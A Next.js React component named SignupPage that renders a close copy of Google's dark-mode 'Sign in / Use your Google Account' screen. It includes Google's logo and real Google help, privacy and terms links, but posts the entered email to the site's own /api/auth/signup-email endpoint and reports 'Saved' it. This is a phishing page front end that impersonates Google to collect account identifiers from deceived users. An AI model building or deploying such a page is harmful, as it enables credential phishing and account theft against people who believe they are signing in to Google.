"use client";

import { FormEvent, useState } from "react";
import { Roboto } from "next/font/google";

const roboto = Roboto({
  weight: ["400", "500"],
  subsets: ["latin"],
  display: "swap",
});

export default function SignupPage() {
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [loading, setLoading] = useState(false);

  async function onSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError("");
    setSuccess("");
    setLoading(true);

    const form = e.currentTarget;
    const email = String(new FormData(form).get("email") ?? "").trim();

    try {
      const res = await fetch("/api/auth/signup-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });
      const data = await res.json().catch(() => ({}));

      if (!res.ok) {
        setError(data.error || "Something went wrong");
        setLoading(false);
        return;
      }

      setSuccess(`Saved ${email}`);
      form.reset();
      setLoading(false);
    } catch {
      setError("Network error. Try again.");
      setLoading(false);
    }
  }

  return (
    <div
      className={`${roboto.className} fixed inset-0 z-50 overflow-auto bg-[#1f1f1f] text-[#e3e3e3]`}
    >
      <div className="min-h-full flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-[1040px] rounded-[28px] border border-[#747775]/40 bg-black px-6 py-9 sm:px-10 sm:py-12 md:px-12 md:py-[48px]">
          <div className="flex flex-col gap-10 md:flex-row md:gap-[48px] lg:gap-[72px]">
            <div className="md:w-[40%] md:min-w-[280px] md:max-w-[420px] shrink-0">
              <svg
                className="mb-[18px]"
                width="48"
                height="48"
                viewBox="0 0 48 48"
                aria-hidden
              >
                <path
                  fill="#4285F4"
                  d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"
                />
                <path
                  fill="#34A853"
                  d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"
                />
                <path
                  fill="#FBBC05"
                  d="M11.69 28.18c-.44-1.32-.69-2.73-.69-4.18s.25-2.86.69-4.18v-5.7H4.34A21.99 21.99 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"
                />
                <path
                  fill="#EA4335"
                  d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"
                />
              </svg>

              <h1 className="text-[36px] sm:text-[44px] leading-[1.15] font-normal text-[#e3e3e3] tracking-[-0.5px]">
                Sign in
              </h1>
              <p className="mt-[16px] text-[16px] leading-[1.5] text-[#e3e3e3]">
                Use your Google Account
              </p>
            </div>

            <form
              onSubmit={onSubmit}
              className="flex flex-1 flex-col min-w-0 md:pt-1"
              noValidate
            >
              <div className="relative">
                <input
                  type="email"
                  id="email"
                  name="email"
                  placeholder=" "
                  autoComplete="email"
                  required
                  className="google-dark-input peer box-border h-[56px] w-full rounded-[4px] border border-[#747775] bg-transparent px-[15px] text-[16px] text-[#e3e3e3] outline-none transition-[border] duration-100 focus:border-2 focus:border-[#a8c7fa] focus:px-[14px]"
                />
                <label
                  htmlFor="email"
                  className="pointer-events-none absolute left-[12px] top-1/2 z-10 -translate-y-1/2 px-[4px] text-[16px] text-[#c4c7c5] transition-all duration-150 ease-out peer-focus:top-0 peer-focus:bg-black peer-focus:text-[12px] peer-focus:leading-none peer-focus:text-[#a8c7fa] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:bg-black peer-[:not(:placeholder-shown)]:text-[12px] peer-[:not(:placeholder-shown)]:leading-none peer-[:not(:placeholder-shown)]:text-[#c4c7c5] peer-[:-webkit-autofill]:top-0 peer-[:-webkit-autofill]:bg-black peer-[:-webkit-autofill]:text-[12px] peer-[:-webkit-autofill]:leading-none peer-focus:peer-[:not(:placeholder-shown)]:text-[#a8c7fa]"
                >
                  Email or phone
                </label>
              </div>

              <button
                type="button"
                className="mt-[9px] -ml-[6px] w-fit rounded px-[6px] py-[6px] text-left text-[14px] font-medium leading-5 text-[#a8c7fa] hover:bg-[#a8c7fa]/[0.08]"
              >
                Forgot email?
              </button>

              <p className="mt-[36px] max-w-[450px] text-[14px] leading-[1.4286] text-[#c4c7c5]">
                Not your computer? Use Guest mode to sign in privately.{" "}
                <span
                  onClick={() => window.open("https://support.google.com/chrome/answer/6130773", "_blank")}
                  className="font-medium text-[#a8c7fa] cursor-pointer hover:underline"
                >
                  Learn more about using Guest mode
                </span>
              </p>

              {error ? (
                <p className="mt-4 text-[14px] text-[#f28b82]" role="alert">
                  {error}
                </p>
              ) : null}
              {success ? (
                <p className="mt-4 text-[14px] text-[#81c995]" role="status">
                  {success}
                </p>
              ) : null}

              <div className="mt-[48px] flex items-center justify-end gap-3 md:mt-auto md:pt-[64px]">
                <button
                  type="button"
                  className="-ml-[12px] cursor-pointer h-10 rounded-full px-3 text-[14px] font-medium text-[#a8c7fa] hover:bg-[#a8c7fa]/[0.08]"
                >
                  Create account
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  aria-busy={loading}
                  className="h-10 min-w-[80px] inline-flex items-center justify-center cursor-pointer rounded-full bg-[#a8c7fa] px-6 text-[14px] font-medium text-[#062e6f] hover:bg-[#aecbfa] disabled:cursor-wait disabled:opacity-80"
                >
                  {loading ? (
                    <span className="inline-block h-5 w-5 animate-spin rounded-full border-2 border-[#062e6f]/25 border-t-[#062e6f]" />
                  ) : (
                    "Next"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>

        <div className="mt-4 flex w-full max-w-[1040px] flex-col gap-3 px-1 text-[12px] leading-4 text-[#e3e3e3] sm:flex-row sm:items-center sm:justify-between">
          <button
            type="button"
            className="inline-flex h-8 items-center gap-1 rounded px-2 hover:bg-white/5"
          >
            English (United States)
            <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
              <path fill="currentColor" d="M7 10l5 5 5-5H7z" />
            </svg>
          </button>
          <div className="flex flex-wrap items-center gap-x-1">
            <a
              href="https://support.google.com/accounts"
              className="rounded px-2 py-1.5 hover:bg-white/5"
              target="_blank"
              rel="noreferrer"
            >
              Help
            </a>
            <a
              href="https://policies.google.com/privacy"
              className="rounded px-2 py-1.5 hover:bg-white/5"
              target="_blank"
              rel="noreferrer"
            >
              Privacy
            </a>
            <a
              href="https://policies.google.com/terms"
              className="rounded px-2 py-1.5 hover:bg-white/5"
              target="_blank"
              rel="noreferrer"
            >
              Terms
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
